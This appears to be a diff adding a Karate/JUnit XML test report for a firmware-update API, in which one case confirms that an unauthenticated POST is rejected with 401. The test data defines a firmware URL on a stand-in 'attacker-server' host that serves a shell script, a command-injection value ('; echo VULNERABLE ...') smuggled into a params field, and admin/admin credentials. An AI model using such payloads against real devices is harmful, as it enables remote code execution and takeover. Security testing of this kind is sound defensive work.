@@ -1,0 +1,12 @@
+<testsuite failures="0" name="ID_003_krtestoas_firmware_update_POST_verified.feature" skipped="0" tests="1" time="0.054279"><testcase classname="ID_003_krtestoas_firmware_update_POST_verified" name="Attempt firmware update without authentication" time="0.054279"><system-out>* url 'http://192.168.1.109:12384' ........................................ passed
+* def validAuth = {username: 'admin', password: 'admin'} .................. passed
+* def invalidAuth = {username: 'user', password: 'wrongpass'} ............. passed
+* def validUpdatePayload = { "firmware_url": "http://attacker-server:63999/dummy.sh", "version": "1.2.3" } . passed
+* def commandInjectionPayload = { "firmware_url": "http://attacker-server:63999/dummy.sh", "version": "1.2.3", "params": "; echo VULNERABLE &gt; /tmp/vuln_test.txt" } . passed
+Given path '/firmware/update' ............................................. passed
+And request validUpdatePayload ............................................ passed
+When method post .......................................................... passed
+Then status 401 ........................................................... passed
+And match response.error == 'Unauthorized' ................................ passed
+</system-out></testcase>
+</testsuite>
